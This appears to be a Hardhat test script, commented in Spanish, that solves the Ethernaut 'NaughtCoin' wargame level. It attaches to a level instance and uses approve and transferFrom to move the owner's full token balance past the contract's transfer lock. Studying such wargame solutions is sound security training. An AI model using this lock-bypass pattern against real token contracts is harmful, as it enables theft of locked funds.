import { assert } from "chai";
import { ethers } from "hardhat";
import { HackedEvent } from "../typechain/HackGatekeeperOne";

describe("Executing", function () {
  it("naughtyCoin debe transferir", async function () {

    // Deploy contracts
    //const gatekeeperContract = await (await ethers.getContractFactory("GatekeeperOne")).deploy();
    //const hackGatekeeperContract = await (await ethers.getContractFactory("HackGatekeeperOne")).deploy();
    //await Promise.all([gatekeeperContract, hackGatekeeperContract].map((contract) => contract.deployed()));

    // Attach to contracts
    const toa='0x10277d5B3bFc0CF0942df744C1AFAC4C545d17b0' //direccion contrato ethernaut gate instanciado
    const tokenContract = await (await ethers.getContractFactory("NaughtCoin")).attach(toa);

    const from='0x9A54200505907852a27307f14d31Afc0875c99Ac' //direccion owner
    const toa2='0xAa0E23a3ac47b0E67c63b19DF4656DD77b3cED59' //direccion contrato destino Tokens
    
    //Transfiere
    const hackTxn = await tokenContract.approve(from,tokenContract.balanceOf(from));
    const hackTxn2 = await tokenContract.transferFrom(from, toa2, tokenContract.balanceOf(from));
  });
});